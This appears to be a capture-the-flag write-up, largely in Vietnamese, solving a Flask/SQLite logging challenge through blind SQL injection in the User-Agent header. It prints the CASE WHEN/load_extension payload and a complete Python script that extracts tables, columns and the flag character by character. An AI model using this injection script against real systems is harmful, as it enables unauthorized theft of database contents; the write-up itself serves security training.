---
title: Blind Logger Middleware
id: Blind_Logger_Middleware
author: Meme
description: "We log all incoming requests in a Flask web application. The middleware should capture and log the following details for each request: the client's IP address, the user agent, the referer, the requested URL, any cookies sent by the client, and the timestamp of the request. The logs should be stored in an SQLite database using the following query.``` INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at) VALUES ('{ip_address}', '{user_agent}', '{referer}', '{url}', '{cookie}', '{created_at}'\r\rIn addition, the challenge also involves handling potential SQL injection attacks. We have implemented a function to sanitise user inputs and prevent such attacks, demonstrating safe coding practices. This function removes special characters from the user inputs before inserting them into the SQL queries. ``` You have to find the FLAG storing a table in the database. Flag format is CHH{XXX}, total 25 characters including CHH{}"
points: 30
difficulty: Medium
date: 16-1-2026
share_link: https://share.note.sx/lj6e7gu9#4yq/q7lUusSGbGr5JyranacL6QJa6ieBlHqxCp73Xt8
share_updated: 2026-01-19T17:53:09+07:00
---
# TL;DR

Brute từng kí tự bằng blind sql injection để lấy thông tin của cả db -> flag

---
# Initial Reconnaissance

![[Pasted image 20260117102052.png]]

Mở chall lên thì đây là thứ duy nhất ta nhìn được

Phần description của chall cung cấp khá nhiều thông tin hãy cùng mình phân tích

---

> We log all incoming requests in a Flask web application. The middleware should capture and log the following details for each request: the client's IP address, the user agent, the referer, the requested URL, any cookies sent by the client, and the timestamp of the request. The logs should be stored in an SQLite database using the following query.
> 
```sql
INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at) VALUES ('{ip_address}', '{user_agent}', '{referer}', '{url}', '{cookie}', '{created_at}')
```
>
> In addition, the challenge also involves handling potential SQL injection attacks. We have implemented a function to sanitise user inputs and prevent such attacks, demonstrating safe coding practices. This function removes special characters from the user inputs before inserting them into the SQL queries.
> 
> **You have to find the FLAG storing a table in the database. Flag format is CHH{XXX}, total 25 characters including CHH{}**

---

Ta có những thông tin sau:
- Database được sử dụng là **SQLite**
- Mỗi khi vào trang web thì server sẽ log lại những thông tin sau:
	- `ip_address`
	- `user_agent`
	- `referer`
	- `url`
	- `cookie`
	- `created_at`
- Flag dài 25 kí tự bao gồm cả `CHH{}`

Sau đấy mình mở burp suite lên và thử fuzzing linh tinh xem có tạo được lỗi không và có tín hiệu tích cực khi chỉnh `user_agent`

![[Pasted image 20260117102802.png]]

Đã thành công khiến cho query bị lỗi nhưng chall lại không hiện rõ lỗi như nào nên bài này chỉ còn cách giải theo hướng blind sql injection

---

# Exploit and get flag

Thay vì chỉ là dấu ' đơn giản thì mình chỉnh sửa lại `user_agent như sau`

```HTTP
User-Agent: ','','','', case when (<condition>) then '' else load_extension(0) end);--
```

Đơn giản thì mình sẽ fill toàn bộ giá trị trong hàm `VALUES` để cho đúng cú pháp và để giá trị cuối là payload của mình

Giải thích: Nếu `<condition>` trả về `True` thì giá trị sẽ chỉ là một xâu rỗng, còn không thì nó sẽ gọi `load_extension(0)` gây lỗi

Toàn bộ lý thuyết là vậy việc còn lại là chỉ việc brute từng kí tự một để lấy cả cái database thôi

Dưới đây là script khai thác của mình

**script.py**:

```python
import requests

URL = "http://103.97.125.56:32609"

def extract(query):
    name = ""
   
    while 1: 
        l = 32
        r = 127
        
        while l < r:
            mid = (l + r) >> 1
            condition = f"{mid} >= UNICODE(SUBSTR(({query}), {len(name) + 1}, 1))"
            payload = {"User-Agent": f"','','','', case when ({condition}) then '' else load_extension(0) end);--"}
            
            response = requests.get(url=URL, headers=payload)
            
            if response.text.strip() == "Logged":
                r = mid
            else:
                l = mid + 1
                
        # Check if end of name
        condition = f"{l} >= UNICODE(SUBSTR(({query}), {len(name) + 1}, 1))"
        payload = {"User-Agent": f"','','','', case when {condition} then '' else load_extension(0) end);--"}
        if requests.get(url=URL, headers=payload).text.strip() == "Error":
            break
        
        name += chr(l)
        
    return name

tables = []
for i in range(1000):
    table_name = extract(f"SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}")
    if not len(table_name):
        break
    tables.append(table_name)

print (f"all tables: {tables}")

for table in tables:
    if table != "flag": 
        continue
    
    collumns = []
    
    for i in range(1000):
        collumn = extract(f"SELECT name FROM PRAGMA_TABLE_INFO('{table}') LIMIT 1 OFFSET {i}")
        if not len(collumn):
            break
        collumns.append(collumn)
        
    print (f"{table}: {collumns}")
    
    for collumn in collumns:
        values = []
        
        for i in range(1000):
            value = extract(f"SELECT {collumn} FROM {table} LIMIT 1 OFFSET {i}")
            if not len(value):
                break
            values.append(value)
            
        print(f"{table}({collumn}): {values}")
        
    break
```

Toàn bộ query lấy thông tin của database mình đều lấy ở [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

Script đúng ra mình viết là để dump ra toàn bộ cái database nhưng do mỗi lần gửi request thì bảng `logger`  lại được cập nhật, nếu cố tình trích hết thì sẽ bị lặp vô hạn cho nên mình sẽ chỉ lấy bảng `flag`

Chạy script ta có kết quả sau:

```bash
all tables: ['logger', 'flag']
flag: ['id', 'secret']
flag(id): ['1']
flag(secret): ['CHH{blInD_sqLi_1N_UPDATE}']
```

**Flag**: `CHH{blInD_sqLi_1N_UPDATE}`